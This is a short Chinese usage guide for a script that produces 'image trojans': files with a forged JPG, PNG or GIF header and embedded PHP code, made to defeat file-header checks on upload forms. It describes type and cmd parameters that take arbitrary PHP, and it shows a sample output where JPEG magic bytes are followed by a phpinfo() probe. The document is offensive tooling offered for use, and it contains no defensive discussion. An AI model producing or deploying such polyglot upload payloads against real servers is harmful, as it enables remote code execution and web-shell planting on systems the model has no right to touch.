# 使用教程

> 本脚本用于bypass文件头校验，支持jpg|png|gif格式文件。

在环境的地址栏输入type参数，填入你想要的类型，再输入cmd参数，填入你想要的php代码，允许不输入cmd，默认采用phpinfo，以便探测图片马能否正常使用。type和cmd都可以用get/post方式传入。

例如：

?type=jpg

回显：

创建成功！文件内容：
ÿØ<?php phpinfo();?>